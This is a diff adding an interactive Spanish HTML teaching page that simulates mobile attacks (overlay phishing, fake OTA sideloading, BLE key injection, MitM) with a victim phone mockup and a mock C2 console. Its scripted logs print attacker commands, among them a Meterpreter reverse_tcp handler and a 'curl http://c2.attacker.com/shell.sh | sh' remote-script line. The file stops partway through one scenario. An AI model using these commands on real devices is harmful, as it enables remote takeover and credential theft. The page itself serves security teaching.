@@ -1,0 +1,979 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Laboratorio Didáctico de Ciberseguridad Móvil</title>
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                        mono: ['Fira Code', 'monospace'],
+                    },
+                    colors: {
+                        cyber: {
+                            bg: '#090d16',
+                            card: '#111827',
+                            border: '#1f2937',
+                            accent: '#3b82f6',
+                            danger: '#ef4444',
+                            warning: '#f59e0b',
+                            success: '#10b981',
+                            terminal: '#050811'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        .console-scroll::-webkit-scrollbar {
+            width: 6px;
+        }
+        .console-scroll::-webkit-scrollbar-track {
+            background: #050811;
+        }
+        .console-scroll::-webkit-scrollbar-thumb {
+            background: #374151;
+            border-radius: 3px;
+        }
+        .phone-case {
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 35px rgba(59, 130, 246, 0.2);
+        }
+        .scanlines {
+            background: linear-gradient(
+                rgba(18, 16, 16, 0) 50%, 
+                rgba(0, 0, 0, 0.25) 50%
+            ), linear-gradient(
+                90deg,
+                rgba(255, 0, 0, 0.03),
+                rgba(0, 255, 0, 0.01),
+                rgba(0, 0, 255, 0.03)
+            );
+            background-size: 100% 3px, 6px 100%;
+        }
+    </style>
+</head>
+<body class="bg-cyber-bg text-slate-100 min-h-screen font-sans flex flex-col justify-between selection:bg-blue-500 selection:text-white">
+
+    <!-- Header Navigation -->
+    <header class="border-b border-cyber-border bg-cyber-card/90 backdrop-blur-md sticky top-0 z-50 px-6 py-3">
+        <div class="max-w-7xl mx-auto flex flex-wrap justify-between items-center gap-4">
+            <div class="flex items-center space-x-3">
+                <div class="bg-blue-600/20 text-blue-400 p-2.5 rounded-xl border border-blue-500/30">
+                    <i class="fa-solid fa-shield-halved text-2xl"></i>
+                </div>
+                <div>
+                    <h1 class="font-bold text-xl leading-tight tracking-wide text-white">Mobile Security Lab <span class="text-xs bg-blue-600 text-white px-2.5 py-0.5 rounded-full ml-2">Suite Didáctica v3.0</span></h1>
+                    <p class="text-xs text-slate-400">Simulador Visual Interactivo: Vista del Smartphone (Víctima) vs Consola C2 (Atacante)</p>
+                </div>
+            </div>
+
+            <!-- OS Switcher -->
+            <div class="flex items-center bg-slate-900 p-1.5 rounded-2xl border border-cyber-border">
+                <button id="btn-android" onclick="setOS('android')" class="flex items-center space-x-2 px-4 py-1.5 rounded-xl text-xs font-semibold transition-all bg-blue-600 text-white shadow-sm">
+                    <i class="fa-brands fa-android text-base"></i>
+                    <span>Android (API 34)</span>
+                </button>
+                <button id="btn-ios" onclick="setOS('ios')" class="flex items-center space-x-2 px-4 py-1.5 rounded-lg text-xs font-semibold transition-all text-slate-400 hover:text-white">
+                    <i class="fa-brands fa-apple text-base"></i>
+                    <span>iOS (v17.4)</span>
+                </button>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Workspace -->
+    <main class="max-w-7xl mx-auto w-full p-4 md:p-6 flex-1 grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
+        
+        <!-- Left Panel: Smartphone Mockup (Victim View) (5 cols) -->
+        <section class="lg:col-span-5 flex flex-col items-center">
+            
+            <div class="w-full text-center mb-3 flex justify-between items-center bg-cyber-card border border-cyber-border px-4 py-2 rounded-xl">
+                <span class="text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center gap-2">
+                    <i class="fa-solid fa-mobile-screen-button text-blue-400"></i> Maqueta Visual Smartphone (Víctima)
+                </span>
+                <span id="active-os-badge" class="text-[10px] bg-blue-500/20 text-blue-300 font-mono px-2 py-0.5 rounded border border-blue-500/30">Android ART</span>
+            </div>
+
+            <!-- Physical Phone Container -->
+            <div class="phone-case relative w-[320px] h-[640px] bg-black rounded-[46px] p-3 border-4 border-slate-800 ring-1 ring-slate-700/50">
+                
+                <!-- Screen Frame -->
+                <div id="phone-screen" class="relative w-full h-full bg-slate-950 rounded-[36px] overflow-hidden flex flex-col justify-between border border-slate-900 select-none">
+                    
+                    <!-- Top Status Bar -->
+                    <div id="phone-status-bar" class="w-full pt-2.5 px-5 pb-1 flex justify-between items-center text-[10px] text-white z-40 bg-gradient-to-b from-black/80 to-transparent font-medium">
+                        <span id="phone-time">09:41</span>
+                        
+                        <!-- Dynamic Notch -->
+                        <div id="phone-notch" class="w-4 h-4 bg-black rounded-full border border-slate-800"></div>
+
+                        <div class="flex items-center space-x-1.5">
+                            <i class="fa-solid fa-signal text-[9px]"></i>
+                            <i class="fa-solid fa-wifi text-[9px]"></i>
+                            <i class="fa-solid fa-battery-full text-[10px]"></i>
+                        </div>
+                    </div>
+
+                    <!-- Screen Viewport -->
+                    <div id="phone-viewport" class="relative w-full flex-1 overflow-hidden bg-slate-900">
+                        
+                        <!-- Home Screen -->
+                        <div id="screen-home" class="w-full h-full p-4 flex flex-col justify-between bg-cover bg-center" style="background-image: radial-gradient(circle at 50% 30%, #1e293b 0%, #0f172a 100%);">
+                            <div class="mt-2 bg-slate-800/40 backdrop-blur-md rounded-2xl p-3 border border-white/5 text-center">
+                                <p class="text-[11px] text-slate-300">Viernes, 6 de Noviembre</p>
+                                <h4 class="text-2xl font-bold text-white mt-0.5">21°C</h4>
+                            </div>
+
+                            <div class="grid grid-cols-4 gap-3 my-auto">
+                                <div onclick="openVictimApp('bank')" class="flex flex-col items-center space-y-1 cursor-pointer group">
+                                    <div class="w-11 h-11 bg-emerald-600 rounded-2xl flex items-center justify-center shadow-lg text-white group-hover:scale-105 transition-transform">
+                                        <i class="fa-solid fa-building-columns text-base"></i>
+                                    </div>
+                                    <span class="text-[9px] text-slate-300">Banca</span>
+                                </div>
+                                <div class="flex flex-col items-center space-y-1 opacity-70">
+                                    <div class="w-11 h-11 bg-blue-500 rounded-2xl flex items-center justify-center text-white">
+                                        <i class="fa-solid fa-envelope text-base"></i>
+                                    </div>
+                                    <span class="text-[9px] text-slate-300">Correo</span>
+                                </div>
+                                <div class="flex flex-col items-center space-y-1 opacity-70">
+                                    <div class="w-11 h-11 bg-amber-500 rounded-2xl flex items-center justify-center text-white">
+                                        <i class="fa-solid fa-image text-base"></i>
+                                    </div>
+                                    <span class="text-[9px] text-slate-300">Fotos</span>
+                                </div>
+                                <div class="flex flex-col items-center space-y-1 opacity-70">
+                                    <div class="w-11 h-11 bg-slate-600 rounded-2xl flex items-center justify-center text-white">
+                                        <i class="fa-solid fa-gear text-base"></i>
+                                    </div>
+                                    <span class="text-[9px] text-slate-300">Ajustes</span>
+                                </div>
+                            </div>
+
+                            <div class="bg-slate-800/60 backdrop-blur-lg rounded-3xl p-2 flex justify-around border border-white/10">
+                                <div class="w-9 h-9 bg-green-500 rounded-xl flex items-center justify-center text-white"><i class="fa-solid fa-phone text-xs"></i></div>
+                                <div class="w-9 h-9 bg-blue-600 rounded-xl flex items-center justify-center text-white"><i class="fa-solid fa-message text-xs"></i></div>
+                                <div class="w-9 h-9 bg-indigo-500 rounded-xl flex items-center justify-center text-white"><i class="fa-solid fa-compass text-xs"></i></div>
+                            </div>
+                        </div>
+
+                        <!-- Legitimate Bank App -->
+                        <div id="layer-legit-app" class="absolute inset-0 bg-slate-900 hidden flex-col justify-between p-4 z-10">
+                            <div class="flex justify-between items-center border-b border-slate-800 pb-2 mt-4">
+                                <div class="flex items-center space-x-2">
+                                    <div class="w-6 h-6 bg-emerald-600 rounded flex items-center justify-center text-white text-xs">
+                                        <i class="fa-solid fa-building-columns"></i>
+                                    </div>
+                                    <span class="font-bold text-xs text-white">Secure Bank Mobile</span>
+                                </div>
+                                <span id="ssl-indicator" class="text-[8px] bg-emerald-500/10 text-emerald-400 px-2 py-0.5 rounded border border-emerald-500/20">SSL/TLS Pinned</span>
+                            </div>
+
+                            <div class="space-y-3 my-auto">
+                                <div class="text-center space-y-1">
+                                    <h4 class="text-xs font-semibold text-white">Iniciar Sesión</h4>
+                                </div>
+                                <div class="space-y-2">
+                                    <div>
+                                        <label class="text-[8px] text-slate-400 uppercase font-semibold">DNI</label>
+                                        <input type="text" readonly value="47892104X" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-2.5 py-1 text-xs text-white">
+                                    </div>
+                                    <div>
+                                        <label class="text-[8px] text-slate-400 uppercase font-semibold">PIN</label>
+                                        <input type="password" readonly value="••••" class="w-full bg-slate-800 border border-slate-700 rounded-lg px-2.5 py-1 text-xs text-white">
+                                    </div>
+                                    <button class="w-full bg-emerald-600 text-white font-semibold text-xs py-1.5 rounded-lg shadow">Acceder</button>
+                                </div>
+                            </div>
+
+                            <div class="text-center text-[8px] text-slate-500">Protected by TLS Pinning</div>
+                        </div>
+
+                        <!-- MALICIOUS OVERLAY LAYER -->
+                        <div id="layer-malicious-overlay" class="absolute inset-0 bg-slate-950/95 hidden flex-col justify-between p-4 z-20 border-2 border-red-500/80">
+                            <div class="flex justify-between items-center border-b border-red-500/30 pb-2 mt-4 bg-red-950/40 p-1.5 rounded-lg">
+                                <span class="font-bold text-[9px] text-red-400">Superposición Maliciosa</span>
+                                <span class="text-[8px] bg-red-500 text-white font-mono px-1 rounded">SYSTEM_ALERT_WINDOW</span>
+                            </div>
+                            <div class="space-y-2 my-auto bg-slate-900 border border-slate-800 p-3 rounded-xl shadow-2xl">
+                                <h4 class="text-[11px] font-bold text-white text-center">Verificación de Seguridad</h4>
+                                <input id="overlay-input-pin" type="text" placeholder="PIN de 4 dígitos" class="w-full bg-slate-950 border border-red-500/50 rounded-lg px-2 py-1 text-xs text-white text-center font-mono">
+                                <input id="overlay-input-pass" type="password" placeholder="Clave de Firma" class="w-full bg-slate-950 border border-red-500/50 rounded-lg px-2 py-1 text-xs text-white text-center font-mono">
+                                <button onclick="simulateOverlaySubmission()" class="w-full bg-red-600 text-white font-bold text-xs py-1.5 rounded-lg">Confirmar</button>
+                            </div>
+                            <div class="text-center text-[8px] text-red-400/80 font-mono">com.malware.overlay.service</div>
+                        </div>
+
+                        <!-- FAKE OTA NOTIFICATION -->
+                        <div id="layer-ota-prompt" class="absolute top-10 inset-x-2 bg-slate-900/95 border border-amber-500/60 rounded-2xl p-3 shadow-2xl hidden z-30">
+                            <div class="flex items-start space-x-2.5">
+                                <div class="w-7 h-7 bg-amber-500/20 text-amber-400 rounded-xl flex items-center justify-center shrink-0 border border-amber-500/30">
+                                    <i class="fa-solid fa-arrows-rotate text-xs"></i>
+                                </div>
+                                <div class="flex-1 min-w-0">
+                                    <h4 class="text-xs font-bold text-white">Actualización de Sistema Urgente</h4>
+                                    <p class="text-[9px] text-slate-300 mt-0.5">Parche v14.2 disponible. Requiere instalación.</p>
+                                    <div class="mt-2 flex space-x-1.5">
+                                        <button onclick="simulateOTAClick()" class="bg-amber-500 text-black font-semibold text-[9px] px-2.5 py-0.5 rounded">Instalar (APK)</button>
+                                        <button onclick="dismissOTAPrompt()" class="bg-slate-800 text-slate-300 text-[9px] px-2 py-0.5 rounded">Posponer</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- BLE PAIRING PROMPT -->
+                        <div id="layer-ble-prompt" class="absolute inset-x-3 bottom-8 bg-slate-900/95 border border-blue-500/60 rounded-2xl p-3 shadow-2xl hidden z-30">
+                            <div class="text-center space-y-1.5">
+                                <i class="fa-brands fa-bluetooth-b text-blue-400 text-base"></i>
+                                <h4 id="ble-modal-title" class="text-xs font-bold text-white">Emparejamiento Bluetooth</h4>
+                                <p class="text-[9px] text-slate-300">"Smart_Keyboard_Pro" solicita vinculación HID.</p>
+                                <div class="pt-1 flex space-x-2">
+                                    <button onclick="simulateBLEAccept()" class="flex-1 bg-blue-600 text-white font-semibold text-[9px] py-1 rounded">Vincular</button>
+                                    <button onclick="dismissBLEPrompt()" class="flex-1 bg-slate-800 text-slate-300 text-[9px] py-1 rounded">Rechazar</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- SMS NOTIFICATION LAYER -->
+                        <div id="layer-sms-prompt" class="absolute top-10 inset-x-2 bg-slate-900/95 border border-emerald-500/60 rounded-2xl p-3 shadow-2xl hidden z-30">
+                            <div class="flex items-start space-x-2.5">
+                                <div class="w-7 h-7 bg-emerald-500/20 text-emerald-400 rounded-xl flex items-center justify-center shrink-0 border border-emerald-500/30">
+                                    <i class="fa-solid fa-message text-xs"></i>
+                                </div>
+                                <div class="flex-1 min-w-0">
+                                    <div class="flex justify-between items-baseline">
+                                        <h4 class="text-xs font-bold text-white">SMS: BancoSeguro</h4>
+                                        <span class="text-[8px] text-slate-400">Ahora</span>
+                                    </div>
+                                    <p class="text-[10px] text-emerald-300 font-mono mt-0.5">Su código de verificación 2FA es: 948201. Válido por 5 minutos.</p>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- WEBVIEW HYBRID LAYER -->
+                        <div id="layer-webview-app" class="absolute inset-0 bg-slate-950 hidden flex-col justify-between p-3 z-10 border border-pink-500/30">
+                            <div class="flex justify-between items-center border-b border-pink-500/20 pb-1.5 mt-4">
+                                <span class="text-[9px] font-bold text-pink-400 flex items-center gap-1">
+                                    <i class="fa-solid fa-globe"></i> WebView Hybrid App (Cordova)
+                                </span>
+                                <span class="text-[7px] bg-pink-950 text-pink-300 font-mono px-1 rounded">JS-Bridge Active</span>
+                            </div>
+                            <div id="webview-content" class="my-auto space-y-2 bg-slate-900 p-2.5 rounded-lg border border-slate-800">
+                                <p class="text-[9px] text-slate-300">Cargando portal interno desde URL remota...</p>
+                                <div class="bg-black/50 p-2 rounded text-[8px] font-mono text-slate-400">
+                                    &lt;script&gt;<br>
+                                    window.AndroidBridge.readLocalFiles();<br>
+                                    &lt;/script&gt;
+                                </div>
+                            </div>
+                            <div class="text-center text-[8px] text-slate-500">Target: addJavascriptInterface()</div>
+                        </div>
+
+                    </div>
+
+                    <!-- Bottom Nav -->
+                    <div id="phone-nav-bar" class="w-full h-4 pb-1 flex justify-center items-center z-40 bg-black/40">
+                        <div id="phone-home-indicator" class="w-16 h-1 bg-slate-600 rounded-full"></div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Right Panel: Attack Vectors & Attacker C2 Console (7 cols) -->
+        <section class="lg:col-span-7 space-y-4">
+            
+            <!-- 7 Attack Vectors Grid -->
+            <div class="bg-cyber-card border border-cyber-border rounded-2xl p-4 space-y-3">
+                <div class="flex justify-between items-center border-b border-cyber-border pb-2">
+                    <h2 class="font-semibold text-xs text-slate-200 uppercase tracking-wider flex items-center gap-2">
+                        <i class="fa-solid fa-crosshairs text-red-400"></i> Seleccionar Vector de Ataque
+                    </h2>
+                    <span class="text-[10px] bg-slate-800 text-slate-300 px-2.5 py-0.5 rounded-md border border-slate-700">7 Módulos Disponibles</span>
+                </div>
+
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-2 max-h-[220px] overflow-y-auto console-scroll pr-1">
+                    <!-- Vector 1 -->
+                    <button onclick="selectVector('overlay')" id="vec-overlay" class="w-full text-left p-2.5 rounded-xl border border-cyber-border bg-slate-900/60 hover:bg-slate-800/80 transition-all group">
+                        <div class="flex items-center space-x-2.5">
+                            <div class="w-7 h-7 rounded-lg bg-red-500/10 text-red-400 border border-red-500/20 flex items-center justify-center text-xs shrink-0">
+                                <i class="fa-solid fa-masks-theater"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-medium text-xs text-white group-hover:text-blue-400">1. Superposición (Overlay)</h3>
+                                <p class="text-[10px] text-slate-400">UI Redressing sobre App Bancaria</p>
+                            </div>
+                        </div>
+                    </button>
+
+                    <!-- Vector 2 -->
+                    <button onclick="selectVector('ota')" id="vec-ota" class="w-full text-left p-2.5 rounded-xl border border-cyber-border bg-slate-900/60 hover:bg-slate-800/80 transition-all group">
+                        <div class="flex items-center space-x-2.5">
+                            <div class="w-7 h-7 rounded-lg bg-amber-500/10 text-amber-400 border border-amber-500/20 flex items-center justify-center text-xs shrink-0">
+                                <i class="fa-solid fa-download"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-medium text-xs text-white group-hover:text-blue-400">2. Fake OTA & Sideloading</h3>
+                                <p class="text-[10px] text-slate-400">Infección por notificación push</p>
+                            </div>
+                        </div>
+                    </button>
+
+                    <!-- Vector 3 -->
+                    <button onclick="selectVector('ble')" id="vec-ble" class="w-full text-left p-2.5 rounded-xl border border-cyber-border bg-slate-900/60 hover:bg-slate-800/80 transition-all group">
+                        <div class="flex items-center space-x-2.5">
+                            <div class="w-7 h-7 rounded-lg bg-blue-500/10 text-blue-400 border border-blue-500/20 flex items-center justify-center text-xs shrink-0">
+                                <i class="fa-brands fa-bluetooth-b"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-medium text-xs text-white group-hover:text-blue-400">3. Spoofing BLE & Key Injection</h3>
+                                <p class="text-[10px] text-slate-400">Inyección HID rápida vía Bluetooth</p>
+                            </div>
+                        </div>
+                    </button>
+
+                    <!-- Vector 4 -->
+                    <button onclick="selectVector('mitm')" id="vec-mitm" class="w-full text-left p-2.5 rounded-xl border border-cyber-border bg-slate-900/60 hover:bg-slate-800/80 transition-all group">
+                        <div class="flex items-center space-x-2.5">
+                            <div class="w-7 h-7 rounded-lg bg-purple-500/10 text-purple-400 border border-purple-500/20 flex items-center justify-center text-xs shrink-0">
+                                <i class="fa-solid fa-network-wired"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-medium text-xs text-white group-hover:text-blue-400">4. MitM & SSL Pinning Bypass</h3>
+                                <p class="text-[10px] text-slate-400">Hooking dinámico con Frida</p>
+                            </div>
+                        </div>
+                    </button>
+
+                    <!-- Vector 5 -->
+                    <button onclick="selectVector('otp')" id="vec-otp" class="w-full text-left p-2.5 rounded-xl border border-cyber-border bg-slate-900/60 hover:bg-slate-800/80 transition-all group">
+                        <div class="flex items-center space-x-2.5">
+                            <div class="w-7 h-7 rounded-lg bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 flex items-center justify-center text-xs shrink-0">
+                                <i class="fa-solid fa-comment-sms"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-medium text-xs text-white group-hover:text-blue-400">5. Notification Listener (2FA)</h3>
+                                <p class="text-[10px] text-slate-400">Robo pasivo de SMS OTP en background</p>
+                            </div>
+                        </div>
+                    </button>
+
+                    <!-- Vector 6 -->
+                    <button onclick="selectVector('webview')" id="vec-webview" class="w-full text-left p-2.5 rounded-xl border border-cyber-border bg-slate-900/60 hover:bg-slate-800/80 transition-all group">
+                        <div class="flex items-center space-x-2.5">
+                            <div class="w-7 h-7 rounded-lg bg-pink-500/10 text-pink-400 border border-pink-500/20 flex items-center justify-center text-xs shrink-0">
+                                <i class="fa-solid fa-code"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-medium text-xs text-white group-hover:text-blue-400">6. WebView JS Bridge RCE</h3>
+                                <p class="text-[10px] text-slate-400">Explotación de addJavascriptInterface</p>
+                            </div>
+                        </div>
+                    </button>
+
+                    <!-- Vector 7 -->
+                    <button onclick="selectVector('heap')" id="vec-heap" class="w-full text-left p-2.5 rounded-xl border border-cyber-border bg-slate-900/60 hover:bg-slate-800/80 transition-all group md:col-span-2">
+                        <div class="flex items-center space-x-2.5">
+                            <div class="w-7 h-7 rounded-lg bg-cyan-500/10 text-cyan-400 border border-cyan-500/20 flex items-center justify-center text-xs shrink-0">
+                                <i class="fa-solid fa-memory"></i>
+                            </div>
+                            <div>
+                                <h3 class="font-medium text-xs text-white group-hover:text-blue-400">7. Memory Scraping (Heap Dump Forensics)</h3>
+                                <p class="text-[10px] text-slate-400">Extracción forense de secretos inmutables en la memoria RAM</p>
+                            </div>
+                        </div>
+                    </button>
+                </div>
+
+                <div class="flex items-center justify-between pt-2">
+                    <button onclick="triggerAttackStep()" id="btn-execute" class="py-2 px-5 bg-blue-600 hover:bg-blue-500 text-white text-xs font-semibold rounded-xl transition-all flex items-center justify-center space-x-2 shadow-lg">
+                        <i class="fa-solid fa-bolt"></i>
+                        <span id="btn-exec-text">Ejecutar Paso</span>
+                    </button>
+                    <button onclick="resetSimulation()" class="py-2 px-4 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold rounded-xl border border-slate-700 transition-all flex items-center justify-center space-x-1.5">
+                        <i class="fa-solid fa-rotate-left"></i>
+                        <span>Reiniciar</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Attacker C2 Terminal Console -->
+            <div class="bg-cyber-terminal border border-cyber-border rounded-2xl overflow-hidden shadow-2xl flex flex-col h-[330px]">
+                
+                <div class="bg-slate-900 px-4 py-2 border-b border-cyber-border flex justify-between items-center">
+                    <div class="flex items-center space-x-2">
+                        <div class="w-2.5 h-2.5 rounded-full bg-red-500"></div>
+                        <div class="w-2.5 h-2.5 rounded-full bg-amber-500"></div>
+                        <div class="w-2.5 h-2.5 rounded-full bg-emerald-500"></div>
+                        <span class="text-xs font-mono text-slate-400 ml-1">c2-listener@attacker-box:~#</span>
+                    </div>
+                    <span id="exploit-status" class="text-[9px] font-mono text-amber-400 bg-amber-950/60 px-2 py-0.5 rounded border border-amber-800/40">TCP:4444 (LISTEN)</span>
+                </div>
+
+                <div id="console-stream" class="flex-1 p-3.5 font-mono text-[11px] text-blue-400 console-scroll overflow-y-auto space-y-1.5 scanlines">
+                    <div class="text-slate-500 text-[10px]">
+                        [+] Servidor C2 de auditoría listo.<br>
+                        [+] Selecciona un vector de ataque arriba y presiona 'Ejecutar Paso'.<br>
+                        ------------------------------------------------
+                    </div>
+                </div>
+
+                <div class="bg-slate-950 px-3 py-2 border-t border-cyber-border flex items-center space-x-2 font-mono text-xs">
+                    <span class="text-emerald-400 font-bold">&gt;</span>
+                    <input type="text" readonly id="console-cmd-input" value="standby --await-payload" class="w-full bg-transparent text-slate-300 focus:outline-none font-mono text-[11px]">
+                </div>
+            </div>
+
+            <!-- Intercepted Data Box & Defensive Countermeasures -->
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="bg-cyber-card border border-cyber-border rounded-2xl p-3 space-y-1">
+                    <div class="flex justify-between items-center mb-1">
+                        <h3 class="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-1.5">
+                            <i class="fa-solid fa-database text-red-400"></i> Capturas C2
+                        </h3>
+                        <span id="data-count-badge" class="text-[9px] font-mono bg-red-500/10 text-red-400 px-2 py-0.5 rounded border border-red-500/20">0 Capturas</span>
+                    </div>
+                    <div id="intercepted-data-box" class="bg-slate-950 border border-slate-800 rounded-xl p-2.5 font-mono text-[10px] text-slate-400 h-20 overflow-y-auto">
+                        <span class="text-slate-600 italic">Esperando exfiltración de datos...</span>
+                    </div>
+                </div>
+
+                <div class="bg-cyber-card border border-cyber-border rounded-2xl p-3 space-y-1">
+                    <h3 class="text-xs font-bold text-emerald-400 uppercase tracking-wider flex items-center gap-1.5 mb-1">
+                        <i class="fa-solid fa-shield-cat"></i> Hardening & Mitigación
+                    </h3>
+                    <div id="defensive-content" class="text-[11px] text-slate-300 space-y-1 leading-relaxed h-20 overflow-y-auto console-scroll">
+                        <p class="text-slate-400 italic">Selecciona un vector para ver las contramedidas asociadas.</p>
+                    </div>
+                </div>
+            </div>
+
+        </section>
+
+    </main>
+
+    <footer class="border-t border-cyber-border bg-cyber-card/50 px-6 py-2.5 text-center text-xs text-slate-400">
+        <div class="max-w-7xl mx-auto flex flex-wrap justify-between items-center gap-2">
+            <span>Entorno Didáctico de Ciberseguridad Móvil &copy; 2026 - Módulo Práctico TIC</span>
+            <div class="flex space-x-4 text-slate-400">
+                <span class="hover:text-blue-400 cursor-pointer"><i class="fa-solid fa-mobile-screen mr-1"></i> Dual View Active</span>
+                <span class="hover:text-blue-400 cursor-pointer"><i class="fa-solid fa-terminal mr-1"></i> C2 Live Logs</span>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        let currentOS = 'android';
+        let currentVector = null;
+        let currentStep = 0;
+        let capturedDataCount = 0;
+
+        const vectorScenarios = {
+            overlay: {
+                name: "Ataque por Superposición (Overlay / Tapjacking)",
+                steps: [
+                    {
+                        victimView: () => { showLayer('layer-legit-app'); setExploitStatus("Esperando Target App", "warning"); },
+                        attackerCmd: "frida -U -f com.target.securebank --no-pause",
+                        logs: [
+                            "[+] Proceso objetivo detectado: com.target.securebank",
+                            "[+] Monitoreando Foreground Task mediante Accessibility Event Listener...",
+                            "[!] La víctima ha abierto la aplicación bancaria legítima."
+                        ]
+                    },
+                    {
+                        victimView: () => {
+                            showLayer('layer-malicious-overlay');
+                            document.getElementById('overlay-input-pin').value = "8492";
+                            document.getElementById('overlay-input-pass').value = "SecurePass2026!";
+                            setExploitStatus("Superposición Desplegada", "danger");
+                        },
+                        attackerCmd: "am start -n com.malware.overlay/.FakeActivity --flags 0x10000000",
+                        logs: [
+                            "[EXPLOIT] Inyectando Activity Maliciosa con FLAG_NOT_FOCUSABLE...",
+                            "[SUCCESS] Pantalla superpuesta (UI Redressing) desplegada sobre la App bancaria.",
+                            "[WAIT] Capturando pulsaciones del teclado en la capa de superposición..."
+                        ]
+                    },
+                    {
+                        victimView: () => { simulateOverlaySubmission(); },
+                        attackerCmd: "cat /sdcard/Android/data/com.malware/files/stolen_keys.log",
+                        logs: [
+                            "[CAPTURADO] Evento de entrada de texto registrado:",
+                            " -> Usuario DNI: 47892104X | PIN: 8492 | Clave: SecurePass2026!",
+                            "[EXFIL] Datos transmitidos con éxito a servidor C2 vía TLS."
+                        ]
+                    }
+                ],
+                defensive: `
+                    <p><strong>Android:</strong> Configurar <code>android:filterTouchesWhenObscured="true"</code> en vistas sensibles.</p>
+                    <p><strong>iOS:</strong> El sandbox nativo bloquea dibujados arbitrarios entre apps sin Jailbreak.</p>
+                `
+            },
+            ota: {
+                name: "Notificación Phishing & Sideloading (Fake OTA)",
+                steps: [
+                    {
+                        victimView: () => { showLayer('layer-ota-prompt'); setExploitStatus("Push Notification Enviada", "warning"); },
+                        attackerCmd: "firebase-admin --send-push --topic='all_devices' --payload='system_update'",
+                        logs: [
+                            "[+] Notificación Push enviada mediante servidor de mensajería emulado.",
+                            "[+] Mostrando banner de 'Actualización de Sistema Urgente' en el teléfono."
+                        ]
+                    },
+                    {
+                        victimView: () => { simulateOTAClick(); setExploitStatus("Sideload Aceptado", "danger"); },
+                        attackerCmd: "adb install -r -g /tmp/malicious_payload.apk",
+                        logs: [
+                            "[!] La víctima hizo clic en la notificación maliciosa.",
+                            "[ALERT] Solicitando permiso: 'Instalar Aplicaciones Desconocidas' (Sideloading).",
+                            "[SUCCESS] APK malicioso instalado con permisos concedidos por la víctima."
+                        ]
+                    },
+                    {
+                        victimView: () => { setExploitStatus("Meterpreter Active", "danger"); },
+                        attackerCmd: "use exploit/multi/handler; set PAYLOAD android/meterpreter/reverse_tcp; run",
+                        logs: [
+                            "[+] Conexión Meterpreter Reversa establecida desde IP víctima.",
+                            "[SUCCESS] Acceso total al almacenamiento interno y sensores del teléfono."
+                        ]
+                    }
+                ],
+                defensive: `
+                    <p><strong>MDM/EMM:</strong> Bloquear centralizadamente la opción "Instalar Fuentes Desconocidas".</p>
+                    <p><strong>iOS:</strong> Revocar perfiles de aprovisionamiento empresarial no auditados.</p>
+                `
+            },
+            ble: {
+                name: "Emparejamiento BLE Malicioso & Key Injection",
+                steps: [
+                    {
+                        victimView: () => { showLayer('layer-ble-prompt'); setExploitStatus("Broadcast BLE Activo", "warning"); },
+                        attackerCmd: "hcitool cmd 0x08 0x0008 1e 02 01 1a ... (BLE Advertisement)",
+                        logs: [
+                            "[+] Emitiendo paquetes de anuncio BLE como periférico de confianza.",
+                            "[!] Diálogo de emparejamiento forzado en la pantalla de la víctima."
+                        ]
+                    },
+                    {
+                        victimView: () => { simulateBLEAccept(); setExploitStatus("BadBT Connected", "danger"); },
+                        attackerCmd: "python3 badbt_inject.py --target-mac C0:26:FF:12:34:56",
+                        logs: [
+                            "[SUCCESS] Emparejamiento Bluetooth aceptado sin verification Passkey.",
+                            "[ATTACK] Iniciando inyección rápida de pulsaciones de teclado (BadBT Script)..."
+                        ]
+                    },
+                    {
+                        victimView: () => { setExploitStatus("Keystrokes Executed", "danger"); },
+                        attackerCmd: "hid_write STRING 'curl http://c2.attacker.com/shell.sh | sh'",
+                        logs: [
+                            "[INJECT] Escribiendo payload ejecutable a 200 caracteres por segundo...",
+                            "[SUCCESS] Script shell remoto ejecutado en background vía comandos HID."
+                        ]
+                    }
+                ],
+                defensive: `
+                    <p><strong>Bluetooth Security:</strong> Forzar emparejamiento en Modo 4 Nivel 4 (Numeric Comparison).</p>
+                    <p>Desactivar visibilidad Bluetooth en entornos públicos.</p>
+                `
+            },
+            mitm: {
+                name: "MitM & Bypass SSL/TLS Pinning (Frida)",
+                steps: [
+                    {
+                        victimView: () => {
+                            showLayer('layer-legit-app');
+                            document.getElementById('ssl-indicator').className = "text-[8px] bg-red-500/10 text-red-400 px-2 py-0.5 rounded border border-red-500/20";
+                            document.getElementById('ssl-indicator').innerText = "SSL Pinning Bypassed";
+                            setExploitStatus("Proxy Intercepting", "warning");
+                        },
+                        attackerCmd: "mitmproxy -p 8080 --mode transparent",
+                        logs: [
+                            "[+] Proxy Man-in-the-Middle iniciado en puerto TCP 8080.",
+                            "[WARN] Tráfico HTTPS bloqueado por Certificate Pinning en la app objetivo."
